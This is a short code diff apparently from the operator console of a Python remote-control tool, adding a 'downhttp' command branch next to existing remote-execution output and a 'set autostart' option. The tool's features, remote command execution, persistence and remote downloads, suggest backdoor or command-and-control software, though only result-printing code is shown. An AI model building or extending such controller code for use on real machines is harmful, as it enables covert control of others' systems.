@@ -225,6 +225,12 @@ while True:
                 print ("")
                 outEXEC = RecvData()
                 print (outEXEC)
+            elif inText.startswith("downhttp"):
+                httpReturn = RecvData()
+                if httpReturn.startswith("Error"):
+                    print colored.red(httpReturn)
+                else:
+                    print colored.green(httpReturn)
             elif inText.startswith("set"):
                 if inText.split(":")[1] == "autostart":
                     SendData(inText)
